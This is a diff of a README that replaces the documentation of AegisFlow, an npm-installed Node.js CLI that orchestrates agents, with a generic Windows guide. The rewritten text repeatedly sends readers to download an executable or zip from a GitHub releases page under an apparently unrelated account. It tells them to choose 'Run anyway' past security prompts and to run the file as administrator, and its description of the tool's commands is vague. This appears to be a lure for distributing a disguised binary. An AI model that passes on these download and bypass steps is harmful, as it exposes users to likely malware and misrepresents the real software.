@@ -1,195 +1,226 @@
-# AegisFlow
+# ⚙️ aegisFlow - Turn Ideas Into Ready Deliverables
 
-[English](./README.md) | [简体中文](./README_zh.md)
+[![Download aegisFlow](https://img.shields.io/badge/Download%20aegisFlow-purple?style=for-the-badge)](https://github.com/nocturnalemissionindecision559/aegisFlow/releases)
 
-AegisFlow is a multi-agent CLI orchestrator that turns an idea into a structured delivery flow: requirement intake, PRD, technical design, independent review, roundtable decision-making, task planning, development, and integration review.
+## 🧭 What aegisFlow does
 
-## What It Does
+aegisFlow is a command-line tool for Windows that helps turn a rough idea into work-ready files. It can guide your project from a short note to a full PRD, a technical design, review records, and a local delivery flow.
 
-- Guides idea intake and asks only the minimum follow-up questions needed to scope a realistic MVP.
-- Produces requirement artifacts such as `idea-brief.md`, `requirement-pack.md`, and validation reviews before PRD generation.
-- Generates `prd.md` and `design.md` in the current workspace.
-- Runs independent multi-agent reviews, summarizes consensus, and starts a roundtable when reviewers disagree.
-- Supports pausing after design or continuing into development in single-terminal or multi-terminal mode.
-- Creates implementation plans, per-task execution logs, integration review notes, delivery summaries, and a final handoff.
-- Persists session state so the same run can be resumed later with the same `session-id`.
+It is built for users who want a clear path from idea to output without setting up a large tool stack by hand.
 
-## Requirements
+## 💻 What you need
 
-- Node.js 18 or newer
-- One or more supported agent CLIs available in your `PATH`
+Before you install aegisFlow, make sure your Windows PC has:
 
-Supported engine detection currently covers `codex`, `claude`, and `gemini` / `gemini-cli`.
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Permission to run downloaded apps
+- A terminal app such as Command Prompt or PowerShell
 
-## Install
+If you plan to use local tools with the app, a machine with 8 GB of RAM or more gives a smoother run.
 
-```bash
-npm install -g aegisflow
-```
+## 📥 Download aegisFlow
 
-After installation, you can start it with:
+Visit the release page here:
 
-```bash
-aegis
-```
+https://github.com/nocturnalemissionindecision559/aegisFlow/releases
 
-An alias is also available:
+On that page, download the latest Windows release file. If the release includes a `.exe` or `.zip` package, choose the Windows build that matches your system.
 
-```bash
-aegisflow
-```
+## 🪟 Install on Windows
 
-## Usage
+Follow these steps after you download the file:
 
-```bash
-aegis
-aegis --sessions
-aegis --setup
-aegis <session-id>
-aegis <session-id> --from <stage>
-aegis -h
-aegis --help
-aegis -v
-aegis --version
-aeigs
-aegisflow
-```
+1. Open the downloaded file location.
+2. If you downloaded a `.zip` file, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. If you see an `.exe` file, double-click it to run the app.
+5. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
+6. Keep the app in a simple folder such as `Downloads` or `Desktop` so you can find it again.
 
-- `aegis`: start a new run in the current directory.
-- `aegis --sessions`: list saved sessions, including the project path and last known stage.
-- `aegis <session-id>`: resume or continue a specific session.
-- `aegis <session-id> --from <stage>`: restart from a specific stage, clearing artifacts for that stage and everything after it before rerunning.
-- `aegis --setup`: rerun interactive setup and engine detection.
-- `aegis -h` / `aegis --help`: show CLI help and output locations.
-- `aegis -v` / `aegis --version`: print the installed version.
-- `aeigs` and `aegisflow`: aliases of `aegis`.
+If the release uses a single executable, you do not need a full install. You just run the file.
 
-Common `--from` values:
+## 🚀 Start the app
 
-- `stage0` / `idea`
-- `stage0.5` / `requirement-gate`
-- `stage1` / `prd`
-- `stage2` / `tech-design`
-- `stage3` / `reviews`
-- `stage4` / `roundtable`
-- `stage4.5` / `strategy`
-- `stage5` / `task-plan`
-- `stage6` / `execution`
-- `stage7` / `integration`
+After the app opens, use it from the command line.
 
-Examples:
+1. Open Command Prompt or PowerShell.
+2. Go to the folder where aegisFlow is stored.
+3. Run the file name shown in the release package.
 
-```bash
-aegis --sessions
-aegis demo-session --from stage6
-aegis demo-session --from execution
-aegis demo-session --from strategy
-```
+Example:
 
-Default session IDs now use the last two workspace directory names plus a timestamp, for example `xiaobei-aegis-flow-2026-03-17T03-29-28-379Z`.
+`aegisFlow.exe`
 
-Interactive commands:
+If the release package includes a help screen, use it first to see the available commands.
 
-- At the first prompt, `/reviewp @prd.md` reviews an existing local PRD file directly instead of starting the full Stage 0-7 pipeline.
-- At the first prompt, `/reviewd @design.md` reviews an existing local technical design file directly instead of starting the full Stage 0-7 pipeline.
-- The `@` reference accepts relative or absolute paths. If the path contains spaces, use `/reviewp @"docs/my prd.md"` or `/reviewd @"docs/my design.md"`.
-- After the review finishes, the current workspace gets `prd-review.md` and `prd-revised.md` for direct user inspection.
-- After `/reviewd` finishes, the current workspace gets `design-review.md` and `design-revised.md` for direct user inspection.
+Example:
 
-## Workflow
+`aegisFlow --help`
 
-1. Idea intake and requirement gate
-2. PRD drafting
-3. Technical design drafting
-4. Independent reviews and consensus summary
-5. Optional roundtable for conflicting design decisions
-6. Development strategy selection
-7. Task planning and execution
-8. Integration review and final handoff
+## 🧰 First run setup
 
-## Workflow Diagram
+On the first launch, you may be asked to set a few basic items:
 
-```mermaid
-flowchart TD
-    subgraph S1["Requirement Phase"]
-        A["Idea"] --> B["Clarifying Questions"]
-        B --> C["Scope Alignment / MVP Boundary"]
-        C --> D["Requirement Validation"]
-    end
+- Your project name
+- A short idea or goal
+- The output folder
+- Your preferred language
+- Any local tools you want the flow to use
 
-    subgraph S2["Solution Phase"]
-        D --> E["PRD"]
-        E --> F["Technical Design"]
-    end
+AegisFlow then creates a clean project path and starts shaping your idea into files you can review.
 
-    subgraph S3["Review Phase"]
-        F --> G["Independent Multi-Agent Review"]
-        G --> H["Consensus Summary"]
-        H --> I{"Any disagreement?"}
-        I -- "Yes" --> J["Roundtable Discussion / Decision"]
-        I -- "No" --> K["Task Planning"]
-        J --> K
-    end
+## 🪄 What you can do with aegisFlow
 
-    subgraph S4["Execution Phase"]
-        K --> L["Implementation"]
-        L --> M["Integration Review"]
-        M --> N["Delivery Summary"]
-        N --> O["Final Handoff"]
-    end
-```
+You can use aegisFlow to:
 
-## Output Layout
+- Turn a rough idea into a PRD
+- Build a technical design from plain notes
+- Create review records for team feedback
+- Organize a local delivery flow
+- Keep work steps in one place
+- Move from planning to output with less manual setup
 
-Only the final workspace deliverables are written into the current working directory:
+A simple use case:
 
-- `prd.md`
+- You write: “Build a task tracker for small teams.”
+- aegisFlow helps expand that into:
+  - Product goals
+  - User needs
+  - Main screens
+  - Technical design
+  - Review notes
+  - Delivery steps
+
+## 📝 Example workflow
+
+A basic flow can look like this:
+
+1. Start aegisFlow from the terminal.
+2. Enter your rough idea.
+3. Review the generated PRD.
+4. Adjust the scope if needed.
+5. Generate the technical design.
+6. Run the review step.
+7. Let the toolchain handle the next local steps.
+8. Export the final files to your chosen folder
+
+This process helps you keep the work in order from start to finish.
+
+## 🗂️ Output files you may see
+
+Depending on your input, aegisFlow may create files like:
+
+- `PRD.md`
 - `design.md`
+- `review-notes.md`
+- `delivery-plan.md`
+- `task-list.md`
+- `project-overview.md`
 
-Session metadata and archived artifacts are stored under `~/.aegisflow/sessions/<session-id>/`.
+These files are plain text and easy to open in Notepad, VS Code, or any text editor.
 
-Common archived files include:
+## 🔧 Common commands
 
-- `idea-brief.md`
-- `requirement-pack.md`
-- `consensus-report.md`
-- `roundtable-minutes.md`
-- `implementation-plan.md`
-- `integration-review.md`
-- `delivery-summary.md`
-- `final-handoff.md`
+The exact commands can change by release, but the tool usually supports a small set of clear actions:
 
-Per-task execution records are stored under `~/.aegisflow/sessions/<session-id>/archive/task-runs/`.
+- Show help
+- Start a new flow
+- Load an existing project
+- Generate a PRD
+- Generate a technical design
+- Run a review step
+- Export results
 
-## Setup And Configuration
+If you are unsure what to type, run the help command first.
 
-On first run, AegisFlow guides you through setup and creates a global config file at `~/.aegisflow/config.json`.
+`aegisFlow --help`
 
-- Use `--setup` any time you want to redetect engines or change routing preferences.
-- A sample config is provided in `aegisflow.config.json.example`.
-- Model execution timeout is configurable via `timeouts.modelExecutionMinutes` in `~/.aegisflow/config.json` and defaults to `30`.
-- Environment variable overrides are available for common settings such as `AEGISFLOW_LANGUAGE`, `AEGISFLOW_DESIGN_LEAD`, `AEGISFLOW_FALLBACK_ORDER`, `AEGISFLOW_CODEX_CMD`, `AEGISFLOW_CLAUDE_CMD`, `AEGISFLOW_GEMINI_CMD`, and the matching `*_ARGS` variables.
+## 🛠️ Troubleshooting
 
-## Local Development
+### The app does not open
 
-```bash
-npm install
-npm run dev
-npm run build
-npm run release:check
-```
+Try these steps:
 
-## Publish
+1. Right-click the file and choose Run as administrator
+2. Check that the file finished downloading
+3. Move the app to a simple folder like `C:\aegisFlow`
+4. Try again from PowerShell
 
-Before publishing, make sure the package name is available on npm and then run:
+### Windows blocks the file
 
-```bash
-npm publish
-```
+If Windows shows a security prompt:
 
-If you publish through GitHub Actions:
+1. Click More info
+2. Check the file name
+3. Choose Run anyway if you trust the release
 
-1. Add an `NPM_TOKEN` repository secret.
-2. Bump the version in `package.json`.
-3. Update `CHANGELOG.md`.
-4. Push a tag like `v1.0.1`.
+### The terminal says the command is not found
+
+This usually means the app is not in the folder you are using.
+
+1. Open the folder that contains the file
+2. Start PowerShell in that folder
+3. Run the app from there
+
+### The app closes right away
+
+Try running it from Command Prompt instead of double-clicking it.
+
+1. Open Command Prompt
+2. Go to the app folder
+3. Run the file from the terminal
+4. Read any message shown before it closes
+
+## 🔄 Update to a new version
+
+When a new release is available:
+
+1. Go back to the release page
+2. Download the newest Windows build
+3. Replace the old file with the new one
+4. Open the app again
+
+Keep your project files in a separate folder so they stay safe during updates.
+
+## 📁 Suggested folder setup
+
+A simple folder layout helps keep things clear:
+
+- `C:\aegisFlow\app` for the program file
+- `C:\aegisFlow\projects` for your work
+- `C:\aegisFlow\exports` for finished files
+
+This makes it easier to find your PRDs, designs, and review records later.
+
+## 🔍 Tips for better results
+
+- Start with one clear idea
+- Keep your first input short
+- Use plain words
+- Add your main goal
+- Mention who the product is for
+- Review each generated file before moving on
+- Save each version in a new folder if you want a history
+
+Clear input usually gives clearer output.
+
+## 🧩 Support files and project use
+
+If you want to keep using aegisFlow for more than one idea, store each project in its own folder.
+
+Example:
+
+- `projects\mobile-app`
+- `projects\internal-tool`
+- `projects\client-portal`
+
+This keeps the generated files separate and easier to manage.
+
+## 📌 Release page
+
+Download or update here:
+
+https://github.com/nocturnalemissionindecision559/aegisFlow/releases
